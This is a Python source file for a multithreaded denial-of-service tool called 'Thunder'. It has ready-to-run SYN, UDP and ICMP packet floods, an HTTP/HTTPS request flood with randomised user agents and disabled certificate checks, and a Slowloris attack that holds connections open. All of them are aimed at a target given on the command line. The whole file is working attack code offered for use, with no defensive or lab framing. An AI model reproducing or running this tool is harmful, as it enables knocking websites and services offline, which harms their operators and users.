import argparse
import logging
import socket
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse

import ssl
from colorama import init
from rich.logging import RichHandler
from scapy.all import ICMP, IP, TCP, UDP, send

from banner import logo
from uagents import get_random_uagent

init(autoreset=True)

logging.basicConfig(
    level=logging.INFO,
    format="[%(asctime)s] %(levelname)s - %(message)s",
    datefmt="%H:%M:%S",
    handlers=[RichHandler()],
)

log = logging.getLogger("rich")


def parse_url(target_url):
    parsed = urlparse(target_url)
    scheme = parsed.scheme or "http"
    host = parsed.hostname
    port = parsed.port or (443 if scheme == "https" else 80)
    path = parsed.path if parsed.path else "/"
    if parsed.query:
        path += "?" + parsed.query
    return scheme, host, port, path


def build_packet(host, path):
    user_agent = get_random_uagent()
    packet = (
        f"GET {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: {user_agent}\r\n"
        f"Connection: close\r\n\r\n"
    )
    return packet.encode("utf-8")


def syn_flood(target_ip, target_port, count=100):
    log.info(f"Starting SYN Flood attack on {target_ip}:{target_port} (count={count})")
    for i in range(count):
        ip = IP(dst=target_ip)
        tcp = TCP(dport=target_port, flags="S")
        send(ip / tcp, verbose=0)
        log.info(f"SYN FLOOD - PACKET {i+1}/{count} sent")
    log.info(f"SYN Flood attack finished on {target_ip}:{target_port}")


def udp_flood(target_ip, target_port, count=100):
    log.info(f"Starting UDP Flood attack on {target_ip}:{target_port} (count={count})")
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = b"X" * 1024
    for i in range(count):
        sock.sendto(data, (target_ip, target_port))
        log.info(f"UDP FLOOD - PACKET {i+1}/{count} sent")
    log.info(f"UDP Flood attack finished on {target_ip}:{target_port}")


def icmp_flood(target_ip, count=100):
    log.info(f"Starting ICMP Flood attack on {target_ip} (count={count})")
    for i in range(count):
        packet = IP(dst=target_ip) / ICMP()
        send(packet, verbose=0)
        log.info(f"ICMP FLOOD - PACKET {i+1}/{count} sent")
    log.info(f"ICMP Flood attack finished on {target_ip}")


def slowloris_attack(target_host, target_port, num_sockets=50):
    log.info(
        f"Starting Slowloris attack on {target_host}:{target_port} (sockets={num_sockets})"
    )
    
    def create_socket(i):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((target_host, target_port))
            s.send(f"GET /?{i} HTTP/1.1\r\n".encode())
            s.send(f"Host: {target_host}\r\n".encode())
            sockets.append(s)
            log.info(f"SLOWLORIS - SOCKET {i+1}/{num_sockets} opened")
            return True
        except socket.timeout:
            log.warning(f"SLOWLORIS - Socket operation timed out for socket {i+1}. Skipping.")
        except socket.error as e:
            log.error(f"SLOWLORIS - Socket error {e} when opening socket {i+1}. Skipping.")
        return False
    
    def send_headers(s, idx):
        try:
            s.send(b"X-a: b\r\n")
            log.info(f"SLOWLORIS - HEADER {pkt_count} sent")
            return True
        except socket.timeout:
            log.warning(f"SLOWLORIS - Socket operation timed out for socket {idx+1}. Removed.")
        except socket.error as e:
            log.error(f"SLOWLORIS - Socket error {e} for socket {idx+1}. Removed.")
        except Exception as e:
            log.critical(f"SLOWLORIS - Unexpected error {type(e).__name__} - {e} for socket {idx+1}. Removed.")
        return False
    
    sockets = []
    for i in range(num_sockets):
        create_socket(i)

    try:
        pkt_count = 0
        while sockets:
            for idx, s in enumerate(sockets[:]):
                pkt_count += 1
                if not send_headers(s, idx):
                    sockets.remove(s)
                    s.close()
            if not sockets:
                log.warning("SLOWLORIS - No sockets left, stopping attack.")
                break
            time.sleep(10)
    except KeyboardInterrupt:
        log.info(f"Slowloris attack stopped on {target_host}:{target_port}")
    finally:
        for s in sockets:
            try:
                s.close()
            except Exception:
                pass


def send_request(i, target_url, _):
    try:
        p = urlparse(target_url)
        host = p.hostname
        port = p.port or (443 if p.scheme == "https" else 80)
        path = p.path or "/"
        if p.query:
            path += "?" + p.query
            
        req = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"User-Agent: {get_random_uagent()}\r\n"
            f"Connection: close\r\n\r\n"
        ).encode()

        if p.scheme == "https":
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            with socket.create_connection((host, port), timeout=1) as sock:
                with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                    ssock.sendall(req)
                    return ssock.recv(1024)
        else:
            with socket.create_connection((host, port), timeout=1) as sock:
                sock.sendall(req)
                return sock.recv(1024)
                
    except Exception as e:
        log.error(f"HTTP FLOOD - Request failed: {e}")
        return None

def run_http_flood(target_url, packages, threads):
    log.info(
        f"Starting HTTP Flood attack on {target_url} (packages={packages}, threads={threads})"
    )
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {
            executor.submit(send_request, i, target_url, None): i
            for i in range(packages)
        }
        completed = 0
        for future in as_completed(futures):
            future.result()
            completed += 1
            log.info(f"HTTP FLOOD - {completed}/{packages} requests sent")
    log.info(f"HTTP Flood attack finished on {target_url}")


def run_syn_flood(host, port, count, threads):
    log.info(
        f"SYN Flood attack started for {host}:{port} (count={count}, threads={threads})"
    )

    def syn_task(_):
        syn_flood(host, port, count // threads)

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(syn_task, i) for i in range(threads)]
        for i, future in enumerate(as_completed(futures), 1):
            future.result()
            log.info(f"SYN FLOOD - {i}/{threads} threads finished")
    log.info(f"SYN Flood attack finished for {host}:{port}")


def run_udp_flood(host, port, count, threads):
    log.info(
        f"UDP Flood attack started for {host}:{port} (count={count}, threads={threads})"
    )

    def udp_task(_):
        udp_flood(host, port, count // threads)

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(udp_task, i) for i in range(threads)]
        for i, future in enumerate(as_completed(futures), 1):
            future.result()
            log.info(f"UDP FLOOD - {i}/{threads} threads finished")
    log.info(f"UDP Flood attack finished for {host}:{port}")


def run_icmp_flood(host, count, threads):
    log.info(f"ICMP Flood attack started for {host} (count={count}, threads={threads})")

    def icmp_task(_):
        icmp_flood(host, count // threads)

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(icmp_task, i) for i in range(threads)]
        for i, future in enumerate(as_completed(futures), 1):
            future.result()
            log.info(f"ICMP FLOOD - {i}/{threads} threads finished")
    log.info(f"ICMP Flood attack finished for {host}")


def run_slowloris(host, port, sockets, threads):
    log.info(
        f"Slowloris attack started for {host}:{port} (sockets={sockets}, threads={threads})"
    )

    def slowloris_task(_):
        slowloris_attack(host, port, sockets // threads)

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = [executor.submit(slowloris_task, i) for i in range(threads)]
        for i, future in enumerate(as_completed(futures), 1):
            future.result()
            log.info(f"SLOWLORIS - {i}/{threads} threads finished")
    log.info(f"Slowloris attack finished for {host}:{port}")


if __name__ == "__main__":
    logo()
    parser = argparse.ArgumentParser(description="Thunder (multi-attack)")
    parser.add_argument("target", help="Target url (http or https)")
    parser.add_argument("--port", help="Port", type=int, default=443)
    parser.add_argument(
        "-pkgs", "--packages", help="Packages count", type=int, default=1000
    )
    parser.add_argument("-t", "--threads", help="Threads count", type=int, default=10)
    parser.add_argument("--https", help="Use https flood", action="store_true")
    parser.add_argument("--syn", help="Use SYN flood", action="store_true")
    parser.add_argument("--udp", help="Use UDP flood", action="store_true")
    parser.add_argument("--icmp", help="Use ICMP flood", action="store_true")
    parser.add_argument("--slowloris", help="Use slowloris flood", action="store_true")
    args = parser.parse_args()

    p = urlparse(args.target)
    host = p.hostname
    port = args.port

    attack_tasks = []

    if args.syn:
        attack_tasks.append((run_syn_flood, (host, port, args.packages, args.threads)))
    if args.https:
        attack_tasks.append((run_http_flood, (args.target, args.packages, args.threads)))
    if args.udp:
        attack_tasks.append((run_udp_flood, (host, port, args.packages, args.threads)))
    if args.icmp:
        attack_tasks.append((run_icmp_flood, (host, args.packages, args.threads)))
    if args.slowloris:
        attack_tasks.append((run_slowloris, (host, port, args.packages, args.threads)))

    if len(attack_tasks) == 0:
        attack_tasks.append((run_http_flood, (args.target, args.packages, args.threads)))
        
    log.info("Starting all attack tasks using ThreadPoolExecutor...")
    with ThreadPoolExecutor(max_workers=len(attack_tasks)) as executor:
        futures = []
        for func, args_tuple in attack_tasks:
            futures.append(executor.submit(func, *args_tuple))
        for i, future in enumerate(as_completed(futures), 1):
            try:
                future.result()
                log.info(f"Attack task {i}/{len(attack_tasks)} finished")
            except Exception as e:
                log.error(f"Attack task {i} raised an exception: {e}")
    log.info("All attacks finished.")
